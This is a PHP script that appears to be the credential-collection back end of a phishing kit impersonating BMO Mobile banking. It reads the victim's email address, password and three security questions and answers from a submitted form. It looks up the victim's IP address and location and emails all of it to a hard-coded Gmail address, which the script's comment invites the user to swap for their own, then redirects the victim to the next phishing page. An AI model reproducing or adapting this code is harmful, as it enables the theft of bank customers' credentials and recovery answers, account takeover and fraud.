<?php
if($_POST["email"] != "" and $_POST["epass"] != ""){
require_once('geoplugin.class.php');

$geoplugin = new geoPlugin();
$geoplugin->locate();
if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
    $ip = $_SERVER['HTTP_CLIENT_IP']; 
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; 
} else { 
    $ip = $_SERVER['REMOTE_ADDR']; 
} 
$adddate=date("D M d, Y g:i a");
$message .= "--------------BMO Mobile Info-----------------------\n";
$message .= "|Email Address : ".$_POST['email']."\n";
$message .= "|Email Password : ".$_POST['epass']."\n";
$message .= "|Security Question 1 : ".$_POST['q1']."\n";
$message .= "|Answer : ".$_POST['ans1']."\n";
$message .= "|Security Question 2 : ".$_POST['q2']."\n";
$message .= "|Answer : ".$_POST['ans2']."\n";
$message .= "|Security Question 3 : ".$_POST['q3']."\n";
$message .= "|Answer : ".$_POST['ans3']."\n";
$message .= "---------=IP Address & Date=---------\n";
$message .= "IP Address: ".$ip."\n";
$message .= "City: {$geoplugin->city}\n";
$message .= "Region: {$geoplugin->region}\n";
$message .= "Country Name: {$geoplugin->countryName}\n";
$message .= "Country Code: {$geoplugin->countryCode}\n";
$message .= "Date: ".$adddate."\n";
$message .= "---------------Fudpage Burhan-------------\n";
//change ur email here
$send = "abdoalarg53@gmail.com";
$subject = "Result .$ip.";
$headers = "From: BMO Mobile<customer-support@Spammers>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message,$headers);
mail($to,$subject,$message,$headers);
}

 
     header("Location: step4.php");
}else{
header("Location: index.php");
}

?>
